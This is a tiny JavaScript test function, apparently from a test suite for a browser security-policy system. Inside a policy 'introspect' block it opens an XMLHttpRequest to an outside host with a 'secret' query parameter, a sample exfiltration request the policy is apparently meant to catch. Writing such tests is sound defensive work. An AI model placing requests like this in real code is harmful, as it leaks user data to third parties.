function runTest() {
  var x = XMLHttpRequest();
  introspect(JAM.policy.p1) {
    x.open("GET", "http://www.blackoutjack.com?secret=1");
  }

  return "RESULT NOT SPECIFIED";
}
